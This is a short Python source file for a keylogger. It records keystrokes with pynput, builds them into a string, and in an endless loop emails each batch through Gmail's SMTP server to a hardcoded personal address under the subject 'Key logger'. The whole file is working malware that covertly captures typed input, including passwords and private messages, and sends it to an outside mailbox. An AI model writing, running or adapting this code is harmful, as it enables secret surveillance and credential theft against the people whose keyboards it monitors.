import pynput
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib

keys = []

def on_press(key):
    global keys
    keys.append(key)

def on_release(key):
    if key == pynput.keyboard.Key.enter:
        return False



def main():
    sender_email = "Sender's email"
    sender_password = "Sender's password"

    recipient_email = "dhruvtyagi01@gmail.com"

    key_string = ''
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    for key in keys:
        if hasattr(key, 'char'):
            key_string += key.char
        elif str(key) == 'Key.space':
            key_string += ' '

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = recipient_email
    message["Subject"] = "Key logger"

    message.attach(MIMEText(key_string))
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, message.as_string())


while True:
    keys = []
    main()
